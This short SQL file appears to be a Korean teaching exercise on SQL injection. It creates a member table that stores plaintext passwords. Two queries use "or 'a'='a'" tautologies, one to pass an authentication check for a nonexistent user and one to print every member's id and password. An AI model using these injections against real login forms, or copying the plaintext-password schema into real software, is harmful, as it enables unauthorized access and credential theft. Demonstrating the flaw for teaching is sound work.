
CREATE TABLE member( 
    id    varchar(10) 	NOT NULL  PRIMARY KEY,
  mname   VARCHAR(30), 
  passwd  VARCHAR(14) 
 );
 
INSERT INTO member(id, mname, passwd)  
VALUES('user1', '개발자1', '1234'); 
INSERT INTO member(id, mname, passwd)  
VALUES('user2', '개발자2', '1234'); 
INSERT INTO member(id, mname, passwd)  
VALUES('user3', '개발자3', '1234');

select count(id) cnt
	from member;
    
-- 비회원도 인증 통과 
SELECT COUNT(id) as cnt 
FROM member 
WHERE id = 'user4' or 'a' = 'a' AND passwd = '1234' or 'a' = 'a';  
 
 
 
 
-- 모든 회원의 정보 출력 
SELECT id, passwd, mname 
FROM member 
WHERE id = 'user10' or 'a' = 'a' AND passwd = '1111' or 'a' = 'a';  